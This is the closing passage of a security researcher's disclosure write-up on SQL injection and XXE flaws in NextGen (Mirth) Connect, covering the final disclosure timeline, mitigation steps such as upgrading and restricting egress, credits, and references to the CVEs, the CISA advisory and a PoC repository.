| 2026-09-04 | Told CISA/VINCE I would publish the PoC and technical write-up after the advisory; asked for concerns or review. |
| 2026-09-10 | CISA advisory published. |
| 2026-09-10 | PoC and technical write-up published. |

## Mitigation

Upgrade to **Connect 4.7.2 or later**.

If you cannot upgrade right away:

- Put the administrative API on a trusted management network only. Finding 1 needs an
  authenticated session, so reachability is your strongest control.
- Rotate anything stored in a connector on an affected server, and assume channel
  configuration on those hosts is compromised if the admin API was ever exposed. The
  cleartext-credential problem is independent of the injection.
- Remove XSLT steps you do not need, and keep untrusted XML away from the ones you do.
- Turn off XML batch processing where it is not required.
- Restrict outbound network access from the Mirth service. Both XXE findings rely on
  the server reaching an attacker-controlled endpoint; blocking egress does not fix
  the parsers, but it does break the exfiltration channel.

Those measures reduce reachability. They do not repair the unsafe SQL construction or
the XML parsers.

## Credit

Findings 1 and 3 should be credited to Abhinav Agarwal. Finding 2 was independently
discovered by me and first reported to NextGen by Youngdu.

Thanks to Nicholas Rupley and Adrian Pastor at NextGen for confirming the findings
quickly, shipping the fixes, and handling CVE coordination.

## References

- **PoC artifacts:** [github.com/abhinavagarwal07/mirth-connect-security-poc](https://github.com/abhinavagarwal07/mirth-connect-security-poc)
- NextGen Connect [4.5.2 release](https://github.com/nextgenhealthcare/connect/releases/tag/4.5.2)
  and pinned [4.5.2 source](https://github.com/nextgenhealthcare/connect/tree/6ce3a9f0e3d84841f0b1e07c2808cf0bdb3d0a78)
- NextGen [release-model FAQ](https://github.com/nextgenhealthcare/connect/wiki/Frequently-Asked-Questions)
- Prior public XSLT report: [nextgenhealthcare/connect#6527](https://github.com/nextgenhealthcare/connect/issues/6527)
- [CVE-2026-82583](https://www.cve.org/CVERecord?id=CVE-2026-82583) - Database Connector SQL injection
- [CVE-2026-78224](https://www.cve.org/CVERecord?id=CVE-2026-78224) - XSLT Step XXE
- [CVE-2026-82578](https://www.cve.org/CVERecord?id=CVE-2026-82578) - XML Batch Adaptor XXE
- CISA advisory [ICSMA-26-253-01](https://www.cisa.gov/news-events/ics-medical-advisories/icsma-26-253-01) / VU#656351
- Apache Derby [`SYSCS_UTIL.SYSCS_EXPORT_QUERY`](https://db.apache.org/derby/docs/10.14/ref/rrefexportselectionproc.html)
  and [`SYSCS_UTIL.SYSCS_FREEZE_DATABASE`](https://db.apache.org/derby/docs/10.14/ref/rreffreezedbproc.html)
- [CWE-89](https://cwe.mitre.org/data/definitions/89.html) ·
  [CWE-611](https://cwe.mitre.org/data/definitions/611.html) ·
  [CWE-312](https://cwe.mitre.org/data/definitions/312.html)
